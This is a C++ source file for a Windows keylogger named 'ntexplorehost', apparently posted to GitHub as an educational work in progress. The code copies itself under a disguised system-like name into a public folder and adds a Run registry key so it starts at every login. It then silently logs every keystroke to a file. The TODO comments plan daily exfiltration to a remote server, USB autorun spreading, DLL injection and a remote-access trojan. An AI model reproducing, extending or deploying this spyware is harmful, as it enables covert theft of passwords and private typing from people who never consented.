/**********************************************************************************
* ntexplorehost key logger (& possibly more)
* 
* date: 1/2/2014
* By: Camron W. Godbout
*
* Created purely for educational purposes. Any damages caused by this program are 
* purely the responsibility of the user.
*
* Keylogger built to work in the background and log all keys pressed by the user.
* Built for persistence and will edit the registry to run at login. It is a work in
* progress but I want it on github in case my VM crashes.
*
* I figured I knew c++ how complex could WIN32 be... 
*
* TODO:
*	(x)Get current directory and move to low key directory
*	(x)Edit registry to add current user run
*	(x)Log pressed keys
*	()Make the program check to see if the registry is edited if so start logging 
*	()Send the log away to remote server once a day - on separate thread
*	()Check to see if USB is connected if so add autorun.ini and hide the exe on there
*	(optional)Perhaps inject the logger as dll into explorer or something important
*	(optional)create a RAT
*/
#include <windows.h>
#include <stdio.h>
#include <winuser.h>
#include <windowsx.h>
#include <string>
#include <iostream>

#define _CRT_SECURE_NO_WARNINGS

#define BUFSIZE 80

using namespace std;

//function definitions
int get_keys(void);


int main(void)
{
	/*
	//this is a WIN32 console application so I hid the cmd prompt.
	HWND hidden;
	AllocConsole();
	hidden = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hidden, 0);
	*/


	//gets current directory and puts it into the systems drive
	//in a desired directory
	char system[MAX_PATH];
	TCHAR szEXEPath[MAX_PATH];
	char pathToFile[MAX_PATH];

	GetModuleFileName(NULL, szEXEPath, MAX_PATH);

	//tedious work around to get the correct path
	for (int i = 0; i < MAX_PATH; i++)
	{
		pathToFile[i] = szEXEPath[i];
	}

	//get the OS mounted drive
	GetSystemDirectory(LPWSTR(system), sizeof(system));


	//where to move the exe to
	strcat(system, ":\\Users\\Public\\Libraries\\ntexplorehost.exe");

	//move the exe to the destination described above
	CopyFileA(pathToFile,system, false);
	
	//move location into the registry
	HKEY hKey;
	
	//try to open the registry
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey) != ERROR_SUCCESS)
	{
		printf("UNABLE TO OPEN REGISTRY KEY\n");
	}
	
	//moves the path into a string
	string sPath(system);

	//again another tedious work around to get the registry to write in ANSI
	//had problems that it would write in UNICODE and the directory would be chinese characters
	//so I had to put the system which is a c-string into a string to a wstring...
	wstring temp(sPath.begin(), sPath.end());
	wstring path;
	path = temp;

    //tries to write to current user run registry
	if (RegSetValueEx(hKey, TEXT("ntexplorehost"), 0, REG_SZ, (const BYTE*)path.c_str(), (path.size() + 1)*sizeof( wchar_t ) ) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		printf("UNABLE TO SET REGISTRY VALUE VALUE_NAME\n");
	}
	else
	{
		printf("VALUE WAS SET!!! SUCESS!\n");
	}

	RegCloseKey(hKey);
	
	//end of persistence this is just here for my benefit incase something breaks

	int t = get_keys();

	return t;
}

int get_keys(void)
{
	short character;
	while (1)
	{
		//we sleep to stop 100% CPU usage
		Sleep(10);
		for (character = 8; character <= 222; character++)
		{
			if (GetAsyncKeyState(character) == -32767)
			{

				FILE *file;
				file = fopen("ntexplorehost.log", "a+");
				if (file == NULL)
				{
					return 1;
				}
				if (file != NULL)
				{
					if ((character >= 39) && (character <= 64))
					{
						fputc(character, file);
						fclose(file);
						break;
					}
					else if ((character>64) && (character<91))
					{
						character += 32;
						fputc(character, file);
						fclose(file);
						break;
					}
					else
					{
						switch (character)
						{
						case VK_SPACE:
							fputc(' ', file);
							fclose(file);
							break;
						case VK_SHIFT:
							fputs("[SHIFT]", file);
							fclose(file);
							break;
						case VK_RETURN:
							fputs("\n[ENTER]", file);
							fclose(file);
							break;
						case VK_BACK:
							fputs("[BACKSPACE]", file);
							fclose(file);
							break;
						case VK_TAB:
							fputs("[TAB]", file);
							fclose(file);
							break;
						case VK_CONTROL:
							fputs("[CTRL]", file);
							fclose(file);
							break;
						case VK_DELETE:
							fputs("[DEL]", file);
							fclose(file);
							break;
						case VK_OEM_1:
							fputs("[;:]", file);
							fclose(file);
							break;
						case VK_OEM_2:
							fputs("[/?]", file);
							fclose(file);
							break;
						case VK_OEM_3:
							fputs("[`~]", file);
							fclose(file);
							break;
						case VK_OEM_4:
							fputs("[ [{ ]", file);
							fclose(file);
							break;
						case VK_OEM_5:
							fputs("[\\|]", file);
							fclose(file);
							break;
						case VK_OEM_6:
							fputs("[ ]} ]", file);
							fclose(file);
							break;
						case VK_OEM_7:
							fputs("['\"]", file);
							fclose(file);
							break;
							/*case VK_OEM_PLUS:
							fputc('+',file);
							fclose(file);
							break;
							case VK_OEM_COMMA:
							fputc(',',file);
							fclose(file);
							break;
							case VK_OEM_MINUS:
							fputc('-',file);
							fclose(file);
							break;
							*/
						case VK_OEM_PERIOD:
							fputc('.',file);
							fclose(file);
							break;
						case VK_NUMPAD0:
							fputc('0', file);
							fclose(file);
							break;
						case VK_NUMPAD1:
							fputc('1', file);
							fclose(file);
							break;
						case VK_NUMPAD2:
							fputc('2', file);
							fclose(file);
							break;
						case VK_NUMPAD3:
							fputc('3', file);
							fclose(file);
							break;
						case VK_NUMPAD4:
							fputc('4', file);
							fclose(file);
							break;
						case VK_NUMPAD5:
							fputc('5', file);
							fclose(file);
							break;
						case VK_NUMPAD6:
							fputc('6', file);
							fclose(file);
							break;
						case VK_NUMPAD7:
							fputc('7', file);
							fclose(file);
							break;
						case VK_NUMPAD8:
							fputc('8', file);
							fclose(file);
							break;
						case VK_NUMPAD9:
							fputc('9', file);
							fclose(file);
							break;
						case VK_CAPITAL:
							fputs("[CAPS LOCK]", file);
							fclose(file);
							break;
						default:
							fclose(file);
							break;
						}
					}
				}
			}
		}

	}
	return EXIT_SUCCESS;
}

